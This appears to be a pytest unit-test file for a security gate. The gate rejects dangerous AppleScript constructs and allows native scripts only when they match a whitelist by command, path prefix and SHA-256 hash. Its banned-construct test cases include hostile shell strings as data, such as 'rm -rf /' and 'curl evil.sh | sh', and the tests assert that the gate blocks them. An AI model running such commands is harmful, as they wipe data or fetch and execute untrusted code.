"""Unit tests for the G5 script gate (applescript review + native whitelist)."""

import hashlib

import pytest

from app.core.atlas.script_gate import (
    ScriptGateError,
    check_native_allowed,
    review_applescript,
)


class TestApplescriptReview:
    @pytest.mark.parametrize(
        "script",
        [
            'tell application "Finder" to do shell script "rm -rf /"',
            'do shell script "curl evil.sh | sh"',
            'tell application "System Events"\n  do shell script "id"\nend tell',
            'with administrator privileges',
            'tell app "X" to sudo',
            'osascript -e "tell app \\"Y\\""',
            'DO SHELL SCRIPT "ls"',
        ],
    )
    def test_banned_constructs(self, script):
        with pytest.raises(ScriptGateError):
            review_applescript(script)

    @pytest.mark.parametrize(
        "script",
        [
            'tell application "Calculator" to activate',
            'tell application "System Events" to keystroke "a"',
            'tell application id "com.apple.calculator" to reopen',
            '',
        ],
    )
    def test_benign_passes(self, script):
        review_applescript(script)


class TestNativeWhitelist:
    def test_default_deny(self, monkeypatch):
        monkeypatch.delenv("EVO_NATIVE_STEP_WHITELIST", raising=False)
        with pytest.raises(ScriptGateError, match="白名单"):
            check_native_allowed("python3", "/tmp/x.py")

    def test_bad_env_json_denies(self, monkeypatch):
        monkeypatch.setenv("EVO_NATIVE_STEP_WHITELIST", "{not json")
        with pytest.raises(ScriptGateError):
            check_native_allowed("python3", "/tmp/x.py")

    def test_prefix_match_allows(self, monkeypatch, tmp_path):
        script = tmp_path / "ok.py"
        script.write_text("print(1)")
        monkeypatch.setenv(
            "EVO_NATIVE_STEP_WHITELIST",
            f'[{{"command": "python3", "script_prefix": "{tmp_path}/"}}]',
        )
        check_native_allowed("python3", str(script))

    def test_wrong_command_denied(self, monkeypatch, tmp_path):
        monkeypatch.setenv(
            "EVO_NATIVE_STEP_WHITELIST",
            f'[{{"command": "python3", "script_prefix": "{tmp_path}/"}}]',
        )
        with pytest.raises(ScriptGateError):
            check_native_allowed("bash", str(tmp_path / "x.sh"))

    def test_hash_mismatch_denied(self, monkeypatch, tmp_path):
        import json

        script = tmp_path / "ok.py"
        script.write_text("print(1)")
        monkeypatch.setenv(
            "EVO_NATIVE_STEP_WHITELIST",
            json.dumps([{"script_prefix": f"{tmp_path}/", "sha256": "0" * 64}]),
        )
        with pytest.raises(ScriptGateError, match="hash 不匹配"):
            check_native_allowed("python3", str(script))

    def test_hash_match_allows(self, monkeypatch, tmp_path):
        script = tmp_path / "ok.py"
        script.write_text("print(1)")
        digest = hashlib.sha256(b"print(1)").hexdigest()
        monkeypatch.setenv(
            "EVO_NATIVE_STEP_WHITELIST",
            f'[{{"script_prefix": "{tmp_path}/", "sha256": "{digest}"}}]',
        )
        check_native_allowed("python3", str(script))
